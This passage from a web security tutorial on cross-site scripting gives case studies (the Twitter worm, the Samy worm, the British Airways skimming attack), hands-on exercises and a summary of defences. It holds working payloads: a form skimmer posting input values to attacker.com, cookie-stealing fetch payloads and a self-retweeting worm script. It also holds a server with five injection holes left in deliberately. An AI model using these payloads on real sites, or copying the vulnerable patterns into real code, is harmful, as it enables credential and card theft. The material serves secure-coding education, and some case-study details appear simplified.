## 8. Real-World XSS Attacks (Case Studies)

### Case Study 1: Twitter XSS Worm (2010)

**What happened:**

* Attacker found XSS vulnerability in tweet display
* Posted a tweet containing: `<script>/* malicious code */</script>`
* Anyone who viewed the tweet got infected
* Their account automatically retweeted it
* **17,000 accounts infected in 1 hour**

**The payload:**

```javascript
<script>
// Retweet this tweet from victim's account
$.post('/retweet', {id: '12345'});

// Post the same malicious tweet
$.post('/tweet', {text: '/* same XSS code */'});
</script>

```

**Result:** Self-replicating worm spread across Twitter.

**Lesson:** Stored XSS can create worms on social media.

---

### Case Study 2: MySpace Samy Worm (2005)

**What happened:**

* Samy Kamkar found XSS in MySpace profiles
* Created a worm that added "Samy is my hero" to profiles
* Automatically added Samy as a friend
* **1 million infections in 24 hours**
* MySpace shut down for several hours

**The technique:** MySpace filtered `<script>` tags, but missed:

```html
<div style="background:url('javascript:alert(1)')">

```

**Result:** Fastest-spreading virus of all time (at that point).

---

### Case Study 3: British Airways (2018)

**What happened:**

* Attackers injected XSS into BA's payment page
* 22 lines of JavaScript
* Intercepted credit card details
* **380,000 customers affected**
* £20 million fine + £183 million fine for GDPR violation

**The payload:**

```javascript
<script>
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('blur', function() {
        fetch('[https://attacker.com/steal](https://attacker.com/steal)', {
            method: 'POST',
            body: JSON.stringify({
                field: input.name,
                value: input.value
            })
        });
    });
});
</script>

```

**Lesson:** XSS can have massive financial impact.

---

## 9. Hands-On Exercises

Now it's your turn! Here are 3 progressively challenging exercises to test your understanding. Do not just use `alert()`—prove you can actually steal data.

---

### 📝 Exercise 1: Find and Fix the XSS (Reflected Attack)

**Scenario:** You inherited this code from a junior developer. Find the Reflected XSS vulnerability and fix it.

**The Code:**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

class ProfileHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/profile':
            params = parse_qs(parsed.query)
            username = params.get('user', ['Guest'])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <!DOCTYPE html>
            <html>
            <head><title>Profile</title></head>
            <body>
                <h1>Profile of {username}</h1>
                <p>Welcome to the profile page!</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), ProfileHandler)
    server.serve_forever()

```

**Your Tasks:**

1. **Identify the vulnerability:** Where is the XSS?
2. **Craft a malicious URL:** Write a URL that successfully injects the **Keylogger** script from Section 4.
3. **Fix the code:** Add proper escaping to the Python server.
4. **Test your fix:** Verify the keylogger URL no longer works.

**Bonus:** Add a CSP header to the Python file for defense-in-depth.

---

### 📝 Exercise 2: Build a Safe Comment System (Stored Attack)

**Scenario:** Build a comment system from scratch that is resistant to XSS.

**Requirements:**

1. Users can post comments (no login required for simplicity)
2. Comments must display properly (including line breaks)
3. Comments must be completely protected against:
* `<script>` injection
* Event handler injection (`onerror`, `onload`, etc.)
* `<iframe>` injection


4. Add a CSP header
5. Display a counter showing how many XSS attempts were blocked

**Starter Template:**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import html

comments = []
blocked_attempts = 0

class SafeCommentHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # TODO: Implement the GET handler
        # - Display all comments (safely!)
        # - Show blocked_attempts counter
        # - Include CSP header
        pass
    
    def do_POST(self):
        # TODO: Implement the POST handler
        # - Detect XSS attempts (e.g. check for '<script>')
        # - Store clean comments
        # - Increment blocked_attempts if XSS detected
        pass

# Start the server below...

```

**Test Cases:**

Try to inject these payloads to steal fake cookies, and verify your system blocks or escapes them:

1. `<script>fetch('http://localhost:9000?cookie=' + document.cookie);</script>`
2. `<img src=x onerror="fetch('http://localhost:9000?cookie=' + document.cookie)">`
3. `<iframe src="javascript:alert('XSS')"></iframe>`

---

### 📝 Exercise 3: The XSS Challenge CTF

**Scenario:** I've created a deliberately vulnerable site with 5 hidden XSS vulnerabilities. Find them all!

**The Site:**

```python
"""
XSS Challenge - Can you find all 5 vulnerabilities?
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import json

# Mock database
users = {
    'alice': {'bio': 'I love coding!', 'website': '[https://alice.com](https://alice.com)'},
    'bob': {'bio': 'Security researcher', 'website': '[https://bob.com](https://bob.com)'}
}

search_history = []

class ChallengeHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # Challenge 1: Search feature
        if parsed.path == '/search':
            query = params.get('q', [''])[0]
            search_history.append(query)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <html>
            <body>
                <h1>Search Results for: {query}</h1>
                <p>No results found.</p>
                <a href="/">Back</a>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        
        # Challenge 2: User profile
        elif parsed.path == '/profile':
            username = params.get('user', ['alice'])[0]
            user_data = users.get(username, {'bio': 'User not found', 'website': ''})
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <html>
            <body>
                <h1>Profile: {username}</h1>
                <p>Bio: {user_data['bio']}</p>
                <p>Website: <a href="{user_data['website']}">Visit</a></p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        
        # Challenge 3: Error page
        elif parsed.path == '/error':
            error_msg = params.get('msg', ['Unknown error'])[0]
            
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <html>
            <body>
                <h1>Error</h1>
                <div class="error-message">{error_msg}</div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        
        # Challenge 4: Recent searches
        elif parsed.path == '/history':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            history_html = '<ul>'
            for search in search_history[-10:]:  # Last 10 searches
                history_html += f'<li>{search}</li>'
            history_html += '</ul>'
            
            html = f"""
            <html>
            <body>
                <h1>Recent Searches</h1>
                {history_html}
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        
        # Challenge 5: JSON API (DOM XSS opportunity)
        elif parsed.path == '/api/user':
            username = params.get('name', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            # Intentionally unsafe JSON
            response = f'{{"username": "{username}", "status": "active"}}'
            self.wfile.write(response.encode())
        
        # Home page with client-side code
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <html>
            <head>
                <title>XSS Challenge</title>
                <script>
                    // Challenge 5: Vulnerable client-side code
                    function loadUser() {
                        const username = location.hash.substr(1);
                        if (username) {
                            fetch('/api/user?name=' + username)
                                .then(r => r.json())
                                .then(data => {
                                    document.getElementById('user-display').innerHTML = 
                                        'Loaded user: ' + data.username;
                                });
                        }
                    }
                    
                    window.onload = loadUser;
                </script>
            </head>
            <body>
                <h1>XSS Challenge</h1>
                <p>Find all 5 XSS vulnerabilities!</p>
                
                <h2>Features:</h2>
                <ul>
                    <li><a href="/search?q=test">Search</a></li>
                    <li><a href="/profile?user=alice">Profile</a></li>
                    <li><a href="/error?msg=Something went wrong">Error Page</a></li>
                    <li><a href="/history">Search History</a></li>
                    <li><a href="/#testuser">User Loader (check URL hash)</a></li>
                </ul>
                
                <div id="user-display"></div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), ChallengeHandler)
    print(f"🎯 XSS Challenge running on http://localhost:{PORT}")
    print("Can you find all 5 vulnerabilities?\n")
    server.serve_forever()

```

**Your Mission:**

1. **Find all 5 XSS vulnerabilities** (there's one in each feature)
2. **Document each:**
* Where is it?
* What type of XSS is it (Reflected/Stored/DOM)?
* Write a proof-of-concept exploit URL using the **Cookie Stealer** payload.


3. **Create a fixed version** of the entire application
4. **Write a security report** explaining each vulnerability

**Hints:**

* Look for places where user input is directly inserted into HTML
* Check URL parameters
* Examine the client-side JavaScript
* Think about indirect attacks (e.g., through the search history)
* One vulnerability is in the JSON API + client-side code combination

**Scoring:**

* Find 1-2 vulnerabilities: Beginner 🌱
* Find 3-4 vulnerabilities: Intermediate 🔍
* Find all 5 vulnerabilities: Expert 🏆
* Fix all 5 + add CSP: Security Master 🛡️

---

## 10. Summary & Key Takeaways

### What You Learned Today:

✅ **XSS Concept:** Injecting malicious code into websites

✅ **Why HTTPS isn't enough:** Encryption ≠ Content validation

✅ **Three XSS types:** Reflected, Stored, DOM-based

✅ **Attack techniques:** Keyloggers, Cookie theft, worms

✅ **Defense layers:**

* HTML escaping (primary)
* Content Security Policy (CSP)
* HttpOnly cookies
* Input validation

### The Mental Model:

```
Security Layers:
┌─────────────────────────────────────┐
│ Defense Layer 4: Input Validation   │ ← Reject bad input early
├─────────────────────────────────────┤
│ Defense Layer 3: HttpOnly Cookies   │ ← Protect session data
├─────────────────────────────────────┤
│ Defense Layer 2: CSP Headers        │ ← Browser-level blocking
├─────────────────────────────────────┤
│ Defense Layer 1: HTML Escaping      │ ← Primary defense
├─────────────────────────────────────┤
│ Your Application Code               │
├─────────────────────────────────────┤
│ HTTPS (Transport Layer)             │ ← Encrypts transit only
└─────────────────────────────────────┘

```

### The Golden Rules:

1. **Never trust user input** - Assume everyone is an attacker
2. **Escape on output** - Not on input (preserve original data)
3. **Defense in depth** - Multiple layers, not just one
4. **Test your defenses** - Try to break your own code

---

**🎓 Congratulations!** You now understand one of the most common and dangerous web vulnerabilities. Use this knowledge responsibly to build more secure applications!

**Remember:** With great power comes great responsibility. These techniques should only be used for:

* ✅ Testing your own applications
* ✅ Authorized penetration testing
* ✅ Educational purposes
* ❌ Never on systems you don't own or have permission to test

```


```